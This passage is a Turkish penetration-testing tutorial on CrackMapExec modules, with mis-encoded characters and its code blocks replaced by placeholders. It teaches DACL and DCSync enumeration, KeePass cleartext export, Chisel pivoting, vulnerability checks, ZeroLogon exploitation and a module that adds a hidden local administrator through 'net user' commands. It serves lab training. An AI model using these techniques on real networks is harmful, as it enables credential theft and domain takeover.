Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

